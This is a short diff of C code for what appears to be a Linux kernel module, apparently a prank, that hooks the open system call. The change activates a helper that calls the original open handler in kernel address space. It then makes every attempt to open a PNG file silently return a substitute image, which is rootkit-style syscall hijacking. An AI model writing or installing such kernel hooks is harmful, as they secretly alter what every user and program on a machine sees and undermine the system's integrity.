@@ -36,19 +36,18 @@ static void enable_wp(void)
 }
 
 
-/* asmlinkage int get_fd(const char *name, int flags, umode_t mode) */
-/* { */
-/*     mm_segment_t old_fs; */
-/*     long fd; */
+asmlinkage int get_fd(const char *name, struct pt_regs *regs)
+{
+    mm_segment_t old_fs;
+    long fd;
+    old_fs = get_fs();
+    set_fs(KERNEL_DS);
+    regs->si = name;
+    fd = (*no_doot_open)(regs);
+    set_fs(old_fs);
 
-/*     old_fs = get_fs(); */
-/*     set_fs(KERNEL_DS); */
-
-/*     fd = (*no_doot_open)(name, flags, mode); */
-/*     set_fs(old_fs); */
-
-/*     return fd; */
-/* } */
+    return fd;
+}
 
 
 static int filecmp(const char *filename, const char *ext)
@@ -77,6 +76,7 @@ asmlinkage long doot_open(const struct pt_regs *regs)
     if (strlen(name) >= 3) {
 	   if (filecmp(name, ".png") || filecmp(name, ".PNG")) { 
             LOG_DOOT;
+            return get_fd(doot_png, regs);
 	   }
 	} 
     /* if (to_doot_or_not_to_doot()) { */
